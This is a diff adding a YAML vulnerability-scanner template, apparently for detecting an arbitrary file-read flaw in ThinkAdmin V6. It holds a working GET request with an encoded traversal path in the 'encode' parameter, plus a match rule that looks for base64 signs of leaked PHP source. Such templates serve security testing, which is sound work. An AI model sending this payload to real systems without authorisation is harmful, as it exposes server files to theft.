@@ -1,0 +1,22 @@
+id: poc-yaml-thinkadmin-v6-readfile
+info:
+  name: Thinkadmin V6 文件读取漏洞
+  severity: medium
+  tags:
+  - 文件读取
+  finger: ThinkAdmin
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b2x322s2t3c1a342w34
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "json") && contains(body, "PD9waH") && contains(body, "VGhpbmtBZG1pbg")
+  output: []
